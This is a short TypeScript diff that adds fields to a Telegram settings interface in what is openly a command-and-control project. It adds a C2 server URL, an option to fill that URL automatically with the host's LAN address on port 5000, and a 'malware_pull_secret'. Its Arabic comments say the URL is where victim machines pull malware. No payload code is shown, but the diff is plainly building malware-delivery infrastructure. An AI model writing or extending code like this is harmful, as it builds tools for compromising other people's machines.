@@ -71,6 +71,11 @@ export interface TelegramSettings {
   chat_ids?: string[];
   c2_group_id?: string;
   c2_channel_id?: string;
+  /** قاعدة URL لسحب malware_pull على أجهزة الضحية — تُكتب في telegram_config.json */
+  c2_server_url?: string;
+  /** إذا true، السيرفر يملأ c2_server_url تلقائياً بـ http://<LAN-IP>:5000 */
+  c2_server_url_auto?: boolean;
+  malware_pull_secret?: string;
 }
 
 export interface TelegramMessage {
